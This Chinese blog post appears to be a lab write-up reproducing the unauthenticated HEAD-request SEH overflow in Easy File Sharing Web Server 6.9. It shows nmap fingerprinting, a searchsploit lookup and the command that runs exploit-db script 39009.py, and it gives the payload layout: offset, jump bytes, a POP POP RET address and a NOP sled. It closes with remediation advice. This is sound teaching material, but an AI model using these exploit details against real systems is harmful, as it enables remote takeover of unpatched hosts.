---
title: Easy File Sharing Web Server 远程溢出漏洞复现
date: 2026-11-08 20:55:00
categories: [网络渗透]
tags: [Easy File Sharing, 缓冲区溢出, SEH, exploit-db, nmap, 渗透测试]
description: 在 Win10 靶机上复现 Easy File Sharing Web Server 6.9 的 HEAD 请求 SEH 栈溢出——nmap 识别服务指纹、searchsploit 定位公开 EXP、一条命令在目标机上弹出计算器。
---

Easy File Sharing Web Server 是 Windows 平台上一款轻量级的 Web 文件共享服务，安装后监听 80 端口，浏览器即可访问文件共享页面。它体积小、部署简单，早年在中小企业和个人用户中很常见。

问题出在它对 HTTP 请求头的处理上：解析 `HEAD` 请求时，服务端把用户可控的字符串拷贝进固定大小的栈缓冲区，且没有做长度校验。请求头一旦超出缓冲区容量，多余的数据就会覆盖栈上的 SEH（结构化异常处理）链表；由于程序编译时没有启用 SafeSEH，攻击者可以用精心构造的地址接管异常处理入口，把执行流劫持到自己的 shellcode 上，实现**无需认证的远程代码执行**。

本次靶机跑的是 `Easy File Sharing Web Server httpd 6.9`，与之同源的 7.2 版本存在同样缺陷。

<!-- more -->

## 环境

| 角色 | 系统 | IP |
|------|------|-----|
| 攻击机 | Kali Linux | 192.168.220.128 |
| 靶机 | Windows 10 x64 | 192.168.220.133 |

靶机装 Easy File Sharing Web Server 并监听 80 端口，两台虚拟机同网段可达。

## 第一步：靶机把服务跑起来

![EFS 服务运行状态](/img/efs-seh-01.png)

安装 `efssetup_20181.exe` 后启动，`Port` 保持 **80**，点 `Start`，底部状态栏显示 `[Web Server is online]` 就说明服务在监听。点 `Go` 能打开本机的共享页面，可以顺手确认一下。

## 第二步：确认网络可达

先确认两台机器通不通：

```bash
ping -c 4 192.168.220.133
```

第一次执行时 4 个包全部丢失：

![ping 不通](/img/efs-seh-02.png)

检查后发现是靶机虚拟网卡没连上，重新连好之后恢复：

![ping 通](/img/efs-seh-03.png)

这一步别跳过。后面所有扫描和利用都建立在网络可达的前提上，先排除连通性问题再往下做，能省掉大量无效排查。

## 第三步：识别目标服务版本

```bash
nmap -sV -p 80 192.168.220.133
```

![nmap 扫描结果](/img/efs-seh-04.png)

关键输出：

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Easy File Sharing Web Server httpd 6.9
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

`-sV` 做的是版本探测，所以除了端口开放，还拿到了服务名和版本号 `6.9`——这正是后面选 EXP 的依据。如果只用 `nmap -p 80`，只能看到 `http`，无法确定版本。

## 第四步：查找对应的漏洞利用代码

Kali 自带 exploit-db 离线库，用 `searchsploit` 检索：

```bash
searchsploit easy file sharing
```

![searchsploit 检索结果](/img/efs-seh-05.jpg)

结果里有两条要分清：

| Exploit Title | 路径 | 说明 |
|---|---|---|
| Easy File Sharing Web Server 7.2 - GET Buffer Overflow (SEH) | windows/remote/39008.py | GET 请求触发 |
| Easy File Sharing Web Server 7.2 - HEAD Request Buffer Overflow (SEH) | windows/remote/39009.py | HEAD 请求触发（本次使用） |

标题标的是 7.2，但 6.9 与该版本在请求头解析上是同一段代码、偏移量一致，脚本对两个版本都适用。

## 第五步：执行 EXP

```bash
python2 /usr/share/exploitdb/exploits/windows/remote/39009.py 192.168.220.133 80
```

![执行 EXP](/img/efs-seh-06.png)

```
Connecting to: 192.168.220.133:80
Done ...
```

脚本跑完回到靶机，可以看到 **EFS 服务进程崩溃，同时弹出了一个计算器**：

![靶机弹出计算器](/img/efs-seh-07.png)

计算器不是目的，它是 shellcode 执行成功的可视证据——说明攻击者已经能在目标机器上执行任意代码。把 shellcode 换成反弹 shell，拿到的就是一个远程控制会话。

## 原理：这个包是怎么构造的

`39009.py` 发出的数据包大致长这样：

```
HEAD  [ 4061 × 'A' ] + [ \xeb\x0a\x90\x90 ] + [ \x98\x97\x01\x10 ] + [ \x90 × 19 ] + [ calc shellcode ]  HTTP/1.0
```

逐段拆开：

1. **4061 字节填充**：把栈缓冲区连同后面的栈帧一路填满，直到刚好顶到 SEH 记录。
2. **`\xeb\x0a\x90\x90`**：一条短跳转（`JMP +0x0A`）加两条 NOP，负责跳过当前 SEH 记录头，落到下一个异常处理指针的位置。
3. **`\x98\x97\x01\x10`**：即 `0x10019798`，指向 EFS 自身模块里的一段 `POP POP RET`。异常发生后系统会调用这个地址，两条 `POP` 把栈上多余的地址弹掉，`RET` 返回到被我们覆盖的下一个 SEH 指针处——这就是经典的 SEH 利用链。
4. **19 字节 NOP 滑板**：留出容错空间，落在滑板任意位置都能滑到 shellcode。
5. **shellcode**：本例是弹出计算器的机器码。

触发之后：栈溢出 → 异常产生 → 异常处理链被劫持 → 跳进 shellcode，全程不需要任何凭据。

## 成因与修复

**成因**：服务端对 HTTP 请求头未做长度校验，超长 HEAD 请求直接覆盖栈上的 SEH 链；且程序未启用 SafeSEH、无 ASLR，异常处理入口和返回地址都可预测。

**修复**：请求头长度做严格校验（根本一条）；用安全字符串函数替代 `strcpy`；编译时启用 `/SAFESEH`、`/GS`、`/NXCOMPAT`；老旧软件无补丁，只能在 WAF/IPS 上拦截异常超长的 HEAD 请求。

## 小结

这次复现走完了「发现 → 识别 → 利用」的链路：`nmap -sV` 拿到服务指纹 → exploit-db 检索到公开 EXP → 一条命令触发溢出，在目标机器上执行任意代码。

两点体会：版本信息就是攻击面；公开 EXP 把漏洞利用的门槛降到了极低，所以及时升级、下线老旧服务是最便宜有效的防护。

## 踩过的坑

**打完一次要重启服务。** 溢出会让 EFS 进程崩溃，同一台靶机第二次利用前必须重新点 `Start`，否则连接直接被拒。

**端口参数要对齐。** 如果靶机上 80 被占用、把 EFS 改成 8000，脚本第二个参数也要跟着改成 8000，忘了改就会一直卡在 `Connecting to...` 然后无响应。

**防火墙。** 靶机不放行 80 端口的话，`nmap` 只会显示 `filtered`，看起来像服务没起来，其实是被拦了。

## 边界声明

所有操作都在本机 VMware 里自建的 Windows 10 靶机上完成，攻击机与靶机处于隔离的 NAT 网段，未涉及任何真实业务系统。文中 EXP 来自公开的 exploit-db，仅用于课程实验与漏洞原理学习。
